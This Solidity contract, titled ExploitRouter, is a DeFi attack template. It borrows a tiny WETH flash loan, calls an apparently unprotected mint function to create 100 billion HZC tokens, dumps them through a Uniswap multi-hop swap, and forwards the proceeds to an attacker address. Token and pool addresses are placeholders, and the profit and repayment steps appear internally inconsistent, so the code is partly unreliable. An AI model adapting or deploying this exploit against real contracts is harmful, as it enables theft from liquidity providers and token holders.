// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IHZC {
    function mint(address to, uint256 amount) external;
    function balanceOf(address) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface ILendingPool {
    function flashLoan(
        address receiver,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IUniswapRouter {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract ExploitRouter {
    address constant HZC = 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA;
    address constant ROUTER = 0xBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB;
    address constant WETH = 0xCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC;
    address constant USDC = 0xDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD;
    address constant POOL = 0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE;

    uint256 constant MINT_100B = 100_000_000_000 * 1e18;
    address payable public immutable ATTACKER;

    constructor(address payable attacker) {
        ATTACKER = attacker;
    }

    function startExploit() external {
        address[] memory assets = new address[](1);
        assets[0] = WETH;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1; // tiny loan just to trigger callback
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;

        ILendingPool(POOL).flashLoan(
            address(this),
            assets,
            amounts,
            modes,
            address(this),
            bytes(""),
            0
        );
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address,
        bytes calldata
    ) external returns (bool) {
        uint256 fee = premiums[0];

        // 1. Mint 100B HZC
        IHZC(HZC).mint(address(this), MINT_100B);

        // 2. Approve router
        IHZC(HZC).approve(ROUTER, type(uint256).max);

        // 3. Dump via multi-hop
        address[] memory path = new address[](3);
        path[0] = HZC;
        path[1] = WETH;
        path[2] = USDC;

        IUniswapRouter(ROUTER).swapExactTokensForTokens(
            MINT_100B,
            1,
            path,
            address(this),
            block.timestamp + 300
        );

        // 4. Send profit to attacker
        IERC20(assets[0]).transfer(
            ATTACKER,
            IERC20(assets[0]).balanceOf(address(this)) - (amounts[0] + fee)
        );

        return true;
    }

    receive() external payable {}
}
